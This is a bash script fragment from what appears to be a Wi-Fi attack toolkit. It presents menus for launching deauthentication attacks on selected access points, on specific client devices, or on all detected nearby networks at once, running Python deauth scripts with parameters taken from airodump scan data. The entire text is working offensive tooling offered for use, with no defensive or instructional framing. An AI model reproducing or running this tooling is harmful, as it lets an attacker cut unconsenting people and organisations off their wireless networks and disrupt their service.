# Deauth Attack Swarm Function
deauth_attack_swarm() {
    echo ""
    echo "💥 DEAUTH ATTACK SWARM"
    echo "====================="
    echo ""
    echo "Choose your target type:"
    echo ""
    echo " 1) 🎯 Router/AP Target (Attack all clients connected to an AP)"
    echo " 2) 📱 Specific Client Target (Attack specific client devices)"
    echo " 3) 🌊 Broadcast Swarm (Attack all nearby networks)"
    echo " 4) ⚡ Direct Aireplay-ng Attack (Multi-channel targeting for hidden APs)"
    echo " 5) 🔍 Quick Target Scan (Scan for new targets, then select attack)"
    echo " 0) ↩️ Back to main menu"
    echo ""
    read -p "Select deauth target type (0-5): " deauth_choice
    
    case $deauth_choice in
        1)
            deauth_attack_router_targets
            ;;
        2)
            deauth_attack_client_targets
            ;;
        3)
            deauth_attack_broadcast_swarm
            ;;
        4)
            direct_aireplay_attack
            ;;
        5)
            quick_target_scan_and_attack
            ;;
        0)
            return
            ;;
        *)
            echo "❌ Invalid choice: $deauth_choice"
            read -p "Press Enter to continue..."
            ;;
    esac
}

# Router/AP target deauth attacks
deauth_attack_router_targets() {
    echo ""
    echo "🎯 ROUTER/AP DEAUTH ATTACK"
    echo "=========================="
    echo ""
    
    # Read available APs from airodump data
    if [ ! -f "$AIRODUMP_DATA_DIR/detected_aps.list" ]; then
        echo "❌ No AP data found! Please run Airodump scanning first (Option 1)"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "📊 Available Router/AP Targets from Airodump Data:"
    echo "================================================="
    
    local ap_count=0
    local -a ap_bssids
    local -a ap_essids
    local -a ap_channels
    
    # Parse AP data: BSSID,ESSID,Power,Channel
    while IFS=',' read -r bssid essid power channel; do
        if [ ! -z "$bssid" ] && [ "$bssid" != "BSSID" ]; then
            ap_count=$((ap_count + 1))
            ap_bssids[$ap_count]="$bssid"
            ap_essids[$ap_count]="$essid"
            ap_channels[$ap_count]="$channel"
            
            # Format display
            local display_essid="$essid"
            [ -z "$essid" ] && display_essid="<Hidden SSID>"
            
            echo " $ap_count) $bssid - $display_essid (Ch:$channel, Pwr:${power}dBm)"
        fi
    done < "$AIRODUMP_DATA_DIR/detected_aps.list"
    
    if [ $ap_count -eq 0 ]; then
        echo "❌ No APs found in airodump data!"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo ""
    echo " 0) ↩️ Back to deauth menu"
    echo ""
    read -p "Select target AP (0-$ap_count): " ap_choice
    
    if [ "$ap_choice" = "0" ]; then
        return
    elif [ "$ap_choice" -gt 0 ] && [ "$ap_choice" -le "$ap_count" ]; then
        local target_bssid="${ap_bssids[$ap_choice]}"
        local target_essid="${ap_essids[$ap_choice]}"
        local target_channel="${ap_channels[$ap_choice]}"
        
        echo ""
        echo "🎯 Selected Target:"
        echo "  BSSID: $target_bssid"
        echo "  ESSID: ${target_essid:-<Hidden>}"
        echo "  Channel: $target_channel"
        echo ""
        
        # Deauth method selection for router target
        echo "Choose deauth attack method:"
        echo ""
        echo " 1) 🚀 Enhanced Deauth V3 (Multi-vector attacks)"
        echo " 2) 🔬 Expert Deauth (Professional techniques)"
        echo " 3) 🌊 Both methods simultaneously"
        echo ""
        read -p "Select attack method (1-3): " method_choice
        
        case $method_choice in
            1)
                launch_enhanced_deauth_router "$target_bssid" "$target_essid" "$target_channel"
                ;;
            2)
                launch_expert_deauth_router "$target_bssid" "$target_essid" "$target_channel"
                ;;
            3)
                launch_dual_deauth_router "$target_bssid" "$target_essid" "$target_channel"
                ;;
            *)
                echo "❌ Invalid method choice"
                ;;
        esac
    else
        echo "❌ Invalid AP selection: $ap_choice"
    fi
    
    read -p "Press Enter to continue..."
}

# Client-specific deauth attacks
deauth_attack_client_targets() {
    echo ""
    echo "📱 CLIENT-SPECIFIC DEAUTH ATTACK"
    echo "================================"
    echo ""
    
    # Read available clients from airodump data
    if [ ! -f "$AIRODUMP_DATA_DIR/detected_clients.list" ]; then
        echo "❌ No client data found! Please run Airodump scanning first (Option 1)"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "📊 Available Client Targets from Airodump Data:"
    echo "=============================================="
    
    local client_count=0
    local -a client_macs
    local -a client_aps
    local -a client_powers
    
    # Parse client data: ClientMAC,Power,Channel,AP_BSSID,,Source
    while IFS=',' read -r client_mac power channel ap_bssid empty source; do
        if [ ! -z "$client_mac" ] && [ "$client_mac" != "Station MAC" ]; then
            client_count=$((client_count + 1))
            client_macs[$client_count]="$client_mac"
            client_aps[$client_count]="$ap_bssid"
            client_powers[$client_count]="$power"
            
            # Get AP name for display
            local ap_name="Unknown"
            if [ -f "$AIRODUMP_DATA_DIR/detected_aps.list" ]; then
                ap_name=$(grep "^$ap_bssid" "$AIRODUMP_DATA_DIR/detected_aps.list" | cut -d',' -f2)
                [ -z "$ap_name" ] && ap_name="<Hidden>"
            fi
            
            echo " $client_count) $client_mac -> $ap_bssid ($ap_name) [Pwr:${power}dBm]"
        fi
    done < "$AIRODUMP_DATA_DIR/detected_clients.list"
    
    if [ $client_count -eq 0 ]; then
        echo "❌ No clients found in airodump data!"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo ""
    echo " 0) ↩️ Back to deauth menu"
    echo ""
    read -p "Select target client (0-$client_count): " client_choice
    
    if [ "$client_choice" = "0" ]; then
        return
    elif [ "$client_choice" -gt 0 ] && [ "$client_choice" -le "$client_count" ]; then
        local target_client="${client_macs[$client_choice]}"
        local target_ap="${client_aps[$client_choice]}"
        
        # Get AP details
        local ap_essid="Unknown"
        local ap_channel="1"
        if [ -f "$AIRODUMP_DATA_DIR/detected_aps.list" ]; then
            local ap_info=$(grep "^$target_ap" "$AIRODUMP_DATA_DIR/detected_aps.list")
            if [ ! -z "$ap_info" ]; then
                ap_essid=$(echo "$ap_info" | cut -d',' -f2)
                ap_channel=$(echo "$ap_info" | cut -d',' -f4)
            fi
        fi
        
        echo ""
        echo "🎯 Selected Target:"
        echo "  Client MAC: $target_client"
        echo "  Connected to: $target_ap (${ap_essid:-<Hidden>})"
        echo "  Channel: $ap_channel"
        echo ""
        
        # Deauth method selection for client target
        echo "Choose deauth attack method:"
        echo ""
        echo " 1) 🚀 Enhanced Client Deauth (Targeted approach)"
        echo " 2) 🔬 Expert Client Deauth (Focused techniques)"
        echo " 3) 🌊 Dual client attack"
        echo ""
        read -p "Select attack method (1-3): " method_choice
        
        case $method_choice in
            1)
                launch_enhanced_deauth_client "$target_client" "$target_ap" "$ap_channel"
                ;;
            2)
                launch_expert_deauth_client "$target_client" "$target_ap" "$ap_channel"
                ;;
            3)
                launch_dual_deauth_client "$target_client" "$target_ap" "$ap_channel"
                ;;
            *)
                echo "❌ Invalid method choice"
                ;;
        esac
    else
        echo "❌ Invalid client selection: $client_choice"
    fi
    
    read -p "Press Enter to continue..."
}

# Broadcast swarm attack
deauth_attack_broadcast_swarm() {
    echo ""
    echo "🌊 BROADCAST DEAUTH SWARM"
    echo "========================"
    echo ""
    echo "⚠️  WARNING: This will attack ALL detected networks!"
    echo "    This is an aggressive attack mode."
    echo ""
    read -p "Are you sure you want to proceed? (yes/no): " confirm
    
    if [ "$confirm" != "yes" ]; then
        echo "Broadcast attack cancelled."
        return
    fi
    
    echo ""
    echo "🚀 Launching broadcast deauth swarm..."
    echo "🎯 Targeting all detected APs and clients simultaneously"
    echo ""
    
    # Create deauth data directory
    local deauth_log_dir="$DEAUTH_DATA_DIR/broadcast_swarm_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$deauth_log_dir"
    
    # Launch both tools in broadcast mode
    echo "Method 1: Enhanced Deauth V3 (Broadcast mode)"
    "$LOCAL_PYTHON3" enhanced_deauth_attack_v3_improved.py --auto --duration 120 > "$deauth_log_dir/enhanced_broadcast.log" 2>&1 &
    
    echo "Method 2: Expert Deauth (All networks)"
    "$LOCAL_PYTHON3" expert_deauth_attack.py --broadcast-all --duration 120 > "$deauth_log_dir/expert_broadcast.log" 2>&1 &
    
    echo ""
    echo "✅ Broadcast deauth swarm launched!"
    echo "📊 Attack logs: $deauth_log_dir/"
    echo "🔄 Duration: 2 minutes per method"
    echo ""
    echo "Press Ctrl+C to stop early, or wait for completion..."
    
    # Wait for attacks to complete
    sleep 130
    echo ""
    echo "🏁 Broadcast deauth swarm completed!"
    
    read -p "Press Enter to continue..."
}

# Enhanced deauth launcher functions
launch_enhanced_deauth_router() {
    local bssid="$1"
    local essid="$2"
    local channel="$3"
    
    echo ""
    echo "🚀 Launching Enhanced Deauth V3 against $essid ($bssid)"
    echo ""
    
    local deauth_log_dir="$DEAUTH_DATA_DIR/enhanced_router_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$deauth_log_dir"
    
    echo "⏳ Starting enhanced deauth attack..."
    "$LOCAL_PYTHON3" enhanced_deauth_attack_v3_improved.py -b "$bssid" -c "$channel" -d 60 > "$deauth_log_dir/attack.log" 2>&1
    
    echo "✅ Enhanced deauth attack completed!"
    echo "📊 Log saved to: $deauth_log_dir/attack.log"
}

launch_expert_deauth_router() {
    local bssid="$1"
    local essid="$2"
    local channel="$3"
    
    echo ""
    echo "🔬 Launching Expert Deauth against $essid ($bssid)"
    echo ""
    
    local deauth_log_dir="$DEAUTH_DATA_DIR/expert_router_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$deauth_log_dir"
    
    echo "⏳ Starting expert deauth attack..."
    "$LOCAL_PYTHON3" expert_deauth_attack.py -b "$bssid" -c "$channel" -t 60 > "$deauth_log_dir/attack.log" 2>&1
    
    echo "✅ Expert deauth attack completed!"
    echo "📊 Log saved to: $deauth_log_dir/attack.log"
}

launch_dual_deauth_router() {
    local bssid="$1"
    local essid="$2" 
    local channel="$3"
    
    echo ""
    echo "🌊 Launching DUAL Deauth Attack against $essid ($bssid)"
    echo ""
    
    local deauth_log_dir="$DEAUTH_DATA_DIR/dual_router_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$deauth_log_dir"
    
    echo "🚀 Method 1: Enhanced Deauth V3..."
    "$LOCAL_PYTHON3" enhanced_deauth_attack_v3_improved.py -b "$bssid" -c "$channel" -d 60 > "$deauth_log_dir/enhanced.log" 2>&1 &
    
    echo "🔬 Method 2: Expert Deauth..."
    "$LOCAL_PYTHON3" expert_deauth_attack.py -b "$bssid" -c "$channel" -t 60 > "$deauth_log_dir/expert.log" 2>&1 &
    
    echo ""
    echo "⏳ Both attacks running simultaneously..."
    echo "🕐 Duration: 1 minute each"
    
    # Wait for both attacks to complete
    wait
    
    echo "✅ Dual deauth attacks completed!"
    echo "📊 Logs saved to: $deauth_log_dir/"
}

# Client-specific deauth launchers
launch_enhanced_deauth_client() {
    local client_mac="$1"
    local ap_bssid="$2"
    local channel="$3"
    
    echo ""
    echo "🚀 Launching Enhanced Client Deauth against $client_mac"
    echo ""
    
    local deauth_log_dir="$DEAUTH_DATA_DIR/enhanced_client_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$deauth_log_dir"
    
    echo "⏳ Starting enhanced client deauth..."
    "$LOCAL_PYTHON3" enhanced_deauth_attack_v3_improved.py -b "$ap_bssid" -c "$channel" --target-client "$client_mac" -d 45 > "$deauth_log_dir/attack.log" 2>&1
    
    echo "✅ Enhanced client deauth completed!"
    echo "📊 Log saved to: $deauth_log_dir/attack.log"
}

launch_expert_deauth_client() {
    local client_mac="$1"
    local ap_bssid="$2"
    local channel="$3"
    
    echo ""
    echo "🔬 Launching Expert Client Deauth against $client_mac"
    echo ""
    
    local deauth_log_dir="$DEAUTH_DATA_DIR/expert_client_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$deauth_log_dir"
    
    echo "⏳ Starting expert client deauth..."
    "$LOCAL_PYTHON3" expert_deauth_attack.py -b "$ap_bssid" --target-client "$client_mac" -t 45 > "$deauth_log_dir/attack.log" 2>&1
    
    echo "✅ Expert client deauth completed!"
    echo "📊 Log saved to: $deauth_log_dir/attack.log"
}

launch_dual_deauth_client() {
    local client_mac="$1"
    local ap_bssid="$2"
    local channel="$3"
    
    echo ""
    echo "🌊 Launching DUAL Client Deauth against $client_mac"
    echo ""
    
    local deauth_log_dir="$DEAUTH_DATA_DIR/dual_client_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$deauth_log_dir"
    
    echo "🚀 Method 1: Enhanced Client Deauth..."
    "$LOCAL_PYTHON3" enhanced_deauth_attack_v3_improved.py -b "$ap_bssid" -c "$channel" --target-client "$client_mac" -d 45 > "$deauth_log_dir/enhanced.log" 2>&1 &
    
    echo "🔬 Method 2: Expert Client Deauth..."  
    "$LOCAL_PYTHON3" expert_deauth_attack.py -b "$ap_bssid" --target-client "$client_mac" -t 45 > "$deauth_log_dir/expert.log" 2>&1 &
    
    echo ""
    echo "⏳ Both client attacks running simultaneously..."
    echo "🕐 Duration: 45 seconds each"
    
    # Wait for both attacks to complete
    wait
    
    echo "✅ Dual client deauth attacks completed!"
    echo "📊 Logs saved to: $deauth_log_dir/"
}